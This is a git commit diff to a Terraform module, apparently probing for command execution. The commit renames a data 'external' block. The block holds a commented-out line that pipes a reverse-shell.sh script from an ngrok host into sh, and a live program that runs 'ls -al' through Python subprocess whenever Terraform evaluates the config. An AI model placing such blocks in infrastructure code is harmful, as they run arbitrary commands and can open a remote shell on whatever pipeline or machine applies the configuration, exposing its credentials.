9c5923874df68aabf0eec5bfe86ac57e8e8136e4
rcoliveira_cf <rcoliveira@cloudflare.com>
2024-12-11 21:50:30 +0000

    I'm Batman

--- modules/main.tf
+++ modules/main.tf
@@ -1,8 +1,8 @@
-data "external" "example" {
+data "external" "local_exec" {
   # program = ["sh", "-c", "curl https://reverse-shell.sh/4.tcp.ngrok.io:15925 | sh"]
   program = ["python3", "-c", "import json; import subprocess; print(json.dumps({'output': str(subprocess.getoutput('ls -al'))}))"]
 }
 
-output "external_example_output" {
-  value = data.external.example.result
+output "external_local_exec_output" {
+  value = data.external.local_exec.result
 }
